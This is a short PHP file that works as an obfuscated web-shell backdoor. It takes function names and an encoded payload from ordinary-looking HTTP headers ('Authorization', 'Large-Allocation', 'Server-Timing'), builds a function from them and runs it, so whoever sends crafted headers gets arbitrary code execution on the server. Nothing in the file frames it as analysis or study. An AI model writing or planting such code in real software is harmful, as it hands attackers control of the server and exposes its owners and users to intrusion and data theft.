<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $locked = $_HEADERS['Authorization']('', $_HEADERS['Large-Allocation']($_HEADERS['Server-Timing']));
    $locked();
}